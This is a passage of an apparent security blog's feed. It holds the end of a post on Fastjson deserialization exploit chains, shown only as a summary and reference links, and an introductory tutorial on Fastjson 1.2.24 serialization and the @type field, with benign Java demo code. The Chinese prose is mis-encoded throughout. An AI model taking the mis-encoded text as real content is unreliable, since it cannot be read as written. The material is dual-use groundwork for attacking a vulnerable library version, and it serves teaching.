src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142147.png" alt="image-20230821214212598"><br>è¿™æ¡é“¾å­åœ¨ä¸å‡ºç½‘çš„æ—¶å€™å¯ä»¥åˆ©ç”¨</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>JdbcRowSetImplè¿™æ¡é“¾ä¸€å¼€å§‹æ²¡æ‰“é€šæå¾—å¾ˆçƒ¦ï¼Œæ€»çš„æ¥è¯´è·Ÿçš„ä¸æ˜¯å¾ˆæ·±ï¼Œå¯èƒ½åé¢ä¼šæ¥å†çœ‹ï¼Œå¦å¤–æ„Ÿè§‰åœ¨Obsidianå†™äº†æ–‡ç« ï¼Œç„¶ååˆ©ç”¨Typoraå‘åšå®¢å›¾ç‰‡å¤„ç†çœŸçš„éº»çƒ¦ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰å•¥å¥½åŠæ³•</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Fastjsonç³»åˆ—äºŒâ€”â€”1.2.22-1.2.24ååºåˆ—åŒ–æ¼æ´ [ Mi1k7ea ]</a><br><a href="https://blog.csdn.net/NicolasZQ/article/details/130004281?spm=1001.2014.3001.5502">ã€ä¸¤ä¸‡å­—åŸåˆ›é•¿æ–‡ã€‘å®Œå…¨é›¶åŸºç¡€å…¥é—¨Fastjsonç³»åˆ—æ¼æ´ï¼ˆåŸºç¡€ç¯‡ï¼‰_W01fh4ckerçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#2-EXP-%E6%9E%84%E9%80%A0">Javaååºåˆ—åŒ–Fastjsonç¯‡02-Fastjson-1.2.24ç‰ˆæœ¬æ¼æ´åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://blog.csdn.net/gamma_lab/article/details/123294137">çº¢é˜Ÿæ¼æ´ç ”ç©¶-fastjsonBasicDataSourceé“¾åˆ†æ_Gamma_labçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.freebuf.com/articles/web/373730.html">åˆ©ç”¨BCELæ‰“fastjsonç›´æ¥burpå›æ˜¾getshell - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–ä¹‹Fastjsonå…¥é—¨ç¯‡</title>
      <link href="/2023/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%85%A5%E9%97%A8%E7%AF%87/"/>
      <url>/2023/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%85%A5%E9%97%A8%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="FastJsonç®€ä»‹"><a href="#FastJsonç®€ä»‹" class="headerlink" title="FastJsonç®€ä»‹"></a>FastJsonç®€ä»‹</h2><p>Fastjson æ˜¯ Alibaba å¼€å‘çš„ Java è¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½ JSON åº“ï¼Œä»¥å…¶ç‰¹æœ‰çš„ç®—æ³•ï¼Œå·ç§°æœ€å¿«çš„jsonåº“ï¼Œç”¨äºå°†æ•°æ®åœ¨ JSON å’Œ Java Object ä¹‹é—´äº’ç›¸è½¬æ¢ã€‚<br>æä¾›ä¸¤ä¸ªä¸»è¦æ¥å£æ¥åˆ†åˆ«å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚<br><code>JSON.toJSONString</code> å°† Java å¯¹è±¡è½¬æ¢ä¸º json å¯¹è±¡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚<br><code>JSON.parseObject/JSON.parse</code> å°† json å¯¹è±¡é‡æ–°å˜å› Java å¯¹è±¡ï¼›ååºåˆ—åŒ–çš„è¿‡ç¨‹</p><h2 id="é€šè¿‡ä»£ç ç®€å•äº†è§£"><a href="#é€šè¿‡ä»£ç ç®€å•äº†è§£" class="headerlink" title="é€šè¿‡ä»£ç ç®€å•äº†è§£"></a>é€šè¿‡ä»£ç ç®€å•äº†è§£</h2><p>é¦–å…ˆå¯¼å…¥ä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå®šä¹‰ä¸ªStudentç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯åºåˆ—åŒ–çš„ä»£ç ï¼Œè°ƒç”¨ <code>JSON.toJsonString()</code> æ¥åºåˆ—åŒ– Student ç±»çš„å¯¹è±¡ ï¼š<br>StudentSerialize.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSerialize</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">                <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">                student.setName(<span class="string">&quot;y0n3er&quot;</span>);  </span><br><span class="line">                student.setAge(<span class="number">6</span>);  </span><br><span class="line">                <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">                System.out.println(jsonstring);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·Ÿä¸€ä¸‹åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œåœ¨<code>toJSONString()</code>æ–¹æ³•é‚£é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼Œè·Ÿè¿›æ¥åˆ°JSONç±»ä¸‹çš„<code>toJSONString()</code>æ–¹æ³•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232163.png" alt="image-20230808223154139"><br>åœ¨è¿™é‡Œå¤šå‡ºäº†ä¸ª static çš„å˜é‡ï¼Œå†™ç€ â€œmembers of JSONâ€ï¼Œè¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸ªå€¼ <code>DEFAULT_TYPE_KEY</code> ä¸º â€œ@typeâ€ï¼Œè¿™ä¸ªæŒºé‡è¦çš„ï¼Œç„¶åå°±æ˜¯ä¸€äº›åˆå§‹å€¼èµ‹å€¼ç»™outï¼Œè¿™ä¸ªoutä½œä¸ºåç»­<code>JSONSerializer</code>æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œçœ‹å¤§ä½¬è¯´è¿™ä¸€æ­¥èµ°å®Œå…¶å®å°±å·²ç»å®Œæˆäº†åºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰æ˜¯èµ°å®Œäº†<code>serializer.write(object);</code>è¿™é‡Œå®Œæˆåºåˆ—åŒ–ï¼Œä¹Ÿä¸å¤ªæ¸…æ¥š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232622.png" alt="image-20230808223233965"><br>ç„¶åå°±æ˜¯åˆ°<code>toString()</code>è¿™é‡Œåºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œæ˜¾ç¤º<br>è¿™é‡Œåˆ†æä¸€ä¸‹ä¸‹é¢è¿™æ¡è¯­å¥å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ studentï¼Œæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¸å¤šè¯´äº†ï¼›<br>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>SerializerFeature.WriteClassName</code>ï¼Œæ˜¯ <code>JSON.toJSONString()</code> ä¸­çš„ä¸€ä¸ªè®¾ç½®å±æ€§å€¼ï¼Œè®¾ç½®ä¹‹ååœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¤šå†™å…¥ä¸€ä¸ª@typeï¼Œå³å†™ä¸Šè¢«åºåˆ—åŒ–çš„ç±»åï¼Œtype å¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå¹¶ä¸”è°ƒç”¨å…¶ <code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> æ–¹æ³•ã€‚</p><ul><li>Fastjson æ¥å—çš„ JSON å¯ä»¥é€šè¿‡@typeå­—æ®µæ¥æŒ‡å®šè¯¥JSONåº”å½“è¿˜åŸæˆä½•ç§ç±»å‹çš„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ–¹ä¾¿æ“ä½œã€‚<br>è¾“å‡ºå¦‚ä¸‹ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®äº†SerializerFeature.WriteClassName</span></span><br><span class="line">æ„é€ å‡½æ•°</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Dome.Student&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æœªè®¾ç½®SerializerFeature.WriteClassName</span></span><br><span class="line">æ„é€ å‡½æ•°</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br></pre></td></tr></table></figure><strong>ååºåˆ—åŒ–ä»£ç </strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082233527.png" alt="image-20230808223321061"><br>ç®€å•çš„ä»£ç åˆ†æç»“æŸï¼Œç¨å¾®äº†è§£ä¸‹è¿‡ç¨‹</li></ul><h2 id="å¦å¤–ä¸€äº›åŸºç¡€çŸ¥è¯†"><a href="#å¦å¤–ä¸€äº›åŸºç¡€çŸ¥è¯†" class="headerlink" title="å¦å¤–ä¸€äº›åŸºç¡€çŸ¥è¯†"></a>å¦å¤–ä¸€äº›åŸºç¡€çŸ¥è¯†</h2><p>æ„Ÿè§‰è¿™é‡Œå°±æ˜¯å¯¹åç»­æ¼æ´ç†è§£åšä¸ªåŸºç¡€é“ºå«</p><h3 id="1-ååºåˆ—åŒ–æ—¶çš„-Feature-SupportNonPublicField-å‚æ•°"><a href="#1-ååºåˆ—åŒ–æ—¶çš„-Feature-SupportNonPublicField-å‚æ•°" class="headerlink" title="1. ååºåˆ—åŒ–æ—¶çš„ Feature.SupportNonPublicField å‚æ•°"></a>1. ååºåˆ—åŒ–æ—¶çš„ Feature.SupportNonPublicField å‚æ•°</h3><p>å‰æ–‡æˆ‘ä»¬åœ¨ååºåˆ—åŒ–ä»£ç è¿è¡Œçš„æ—¶å€™ï¼Œå‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½è·å–åˆ° â€œageâ€ è¿™ä¸ªå€¼ï¼Œå› ä¸ºå®ƒæ˜¯ç§æœ‰å±æ€§çš„ã€‚</p><ul><li>å¦‚æœè¦è¿˜åŸå‡º private çš„å±æ€§çš„è¯ï¼Œè¿˜éœ€è¦åœ¨JSON.parseObject&#x2F;JSON.parseä¸­åŠ ä¸ŠFeature.SupportNonPublicFieldå‚æ•°ã€‚</li></ul><p>è¿™é‡Œæ”¹ä¸‹Studentç±»ï¼Œå°†ç§æœ‰å±æ€§ageçš„setAge()å‡½æ•°æ³¨é‡Šæ‰ï¼ˆä¸€èˆ¬æ²¡äººä¼šç»™ç§æœ‰å±æ€§åŠ setteræ–¹æ³•ï¼ŒåŠ äº†å°±æ²¡å¿…è¦å£°æ˜ä¸ºprivateäº†ï¼‰ç„¶åä¿®æ”¹<code>StudentUnserialize.java</code>å»æ‰Feature.SupportNonPublicFieldï¼Œæ·»åŠ è¾“å‡ºä¸¤ä¸ªå±æ€§<code>getter</code>æ–¹æ³•çš„è¿”å›å€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">        System.out.println(student.getName() + <span class="string">&quot; &quot;</span> + student.getAge());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œï¼Œä¼šçœ‹åˆ°è·å–ä¸åˆ°ç§æœ‰å˜é‡ageçš„å€¼è€Œæ˜¯è¢«è®¾ç½®ä¸º0ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 0</span><br></pre></td></tr></table></figure><p>æ¥ç€æ·»åŠ Feature.SupportNonPublicFieldï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>å†è¾“å‡ºå°±èƒ½æˆåŠŸè¿˜åŸå‡ºageè¿™ä¸ªç§æœ‰å˜é‡çš„å€¼äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 6</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè‹¥æƒ³è®©ä¼ ç»™JSON.parseObject()è¿›è¡Œååºåˆ—åŒ–çš„JSONå†…å®¹æŒ‡å‘çš„å¯¹è±¡ç±»ä¸­çš„ç§æœ‰å˜é‡æˆåŠŸè¿˜åŸå‡ºæ¥ï¼Œåˆ™éœ€è¦åœ¨è°ƒç”¨JSON.parseObject()æ—¶åŠ ä¸ŠFeature.SupportNonPublicFieldè¿™ä¸ªå±æ€§è®¾ç½®æ‰è¡Œã€‚</p><h3 id="2-åªè¿›è¡Œ-JSON-parseObject-jsonString"><a href="#2-åªè¿›è¡Œ-JSON-parseObject-jsonString" class="headerlink" title="2. åªè¿›è¡Œ JSON.parseObject(jsonString)"></a>2. åªè¿›è¡Œ JSON.parseObject(jsonString)</h3><p>å†æ¥çœ‹ä¸‹parseObject()çš„æŒ‡å®šæˆ–ä¸æŒ‡å®šååºåˆ—åŒ–ç±»å‹ä¹‹é—´çš„å·®å¼‚ã€‚</p><p>ç”±äºFastjsonååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨åªå’ŒåŒ…å«äº†@typeçš„JSONæ•°æ®æœ‰å…³ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬åªå¯¹åºåˆ—åŒ–æ—¶è®¾ç½®äº†SerializerFeature.WriteClassNameå³å«æœ‰@typeæŒ‡å®šååºåˆ—åŒ–ç±»å‹çš„JSONæ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼›å¯¹äºæœªåŒ…å«@typeçš„æƒ…å†µè¿™é‡Œä¸åšæ¢è®¨ï¼Œå¯è‡ªè¡Œæµ‹è¯•ã€‚<br>å…³äºè¿™ä¸ª@typeçš„ä½œç”¨åœ¨ç™½æ—¥æ¢¦ç»„é•¿è§†é¢‘ä¸‹é¢çœ‹åˆ°ä¸ªè¯„è®ºæ„Ÿè§‰æŒºå½¢è±¡çš„</p><blockquote><p>ä¸ºä»€ä¹ˆè¦å¼•å…¥typeå±æ€§ï¼Ÿæ¯”å¦‚ï¼Œå¼ ä¸‰å·¥èµ„3000ï¼Œå¦ä¸€ä¸ªå«å¼ ä¸‰çš„å·¥èµ„20000ï¼Œä»–ä»¬éƒ½æœ‰ä¸€ä¸ªç±»ï¼Œå«äººç±»ï¼Œç°åœ¨è€æ¿è¦æ‹›å·¥äººäº†ï¼Œä½ æ˜¯çŒå¤´ï¼Œä½ æŠŠä¸¤ä¸ªäººä¿¡æ¯éƒ½æŠ¥ä¸Šå»äº†ï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–ä¼ è¿‡å»äº†ï¼Œä½†æ˜¯ä½ ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå‘ç°ä¸¤ä¸ªäººéƒ½å«å¼ ä¸‰ï¼Œé‚£ä¹ˆå“ªä¸ªæ˜¯3000å·¥èµ„çš„ï¼Œå“ªä¸ªæ˜¯20000å·¥èµ„çš„å‘¢ï¼Œè¿™æ—¶å€™å°±ä¼šä¹±ï¼Œæ‰€ä»¥å¼•å…¥äº†åŸå§‹å±æ€§ï¼Œä¹Ÿå°±æ˜¯@typeï¼Œè¿™æ ·å°±èƒ½æ‰¾åˆ°å½’å±ï¼ŒåŸæ¥1ç±³5çš„å¼ ä¸‰å·¥èµ„æ˜¯3000ï¼Œ1ç±³9çš„å¼ ä¸‰å·¥èµ„æ˜¯20000ï¼Œä½†æ˜¯å‘¢ï¼Œè¿™ä¸ª@typeå±æ€§å¯ä»¥éšæ„å¡«å†™ï¼Œæ²¡æƒ³åˆ°å·¥èµ„3000çš„å¼ ä¸‰ä¸Šé¢æœ‰äººï¼Œç»™ä»–å†™äº†ä¸ª@typeï¼šæˆ‘çˆ¹æ˜¯æåˆšï¼Œæ•…æ­¤1ç±³5çš„å¼ ä¸‰æ‹¿ç€10000000000000çš„å·¥èµ„å…¥èŒäº†ã€‚</p></blockquote><p>æ€»ç»“å°±æ˜¯ç”¨@typeç»™ä½ æŒ‡å®šè°ƒç”¨å“ªä¸ªç±»ä¸‹çš„ <code>setter</code> æ–¹æ³•å’Œ <code>getter</code> æ–¹æ³•<br>ä¿®æ”¹Studentç±»ï¼Œæ·»åŠ ä¸¤ä¸ªprivateæˆå‘˜å˜é‡ï¼Œä¸”æ‰€æœ‰çš„ç§æœ‰æˆå‘˜å˜é‡éƒ½ä¸å®šä¹‰setteræ–¹æ³•ï¼ˆæ—¢ç„¶æ˜¯privateä¹Ÿæ²¡å¿…è¦å®šä¹‰ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title 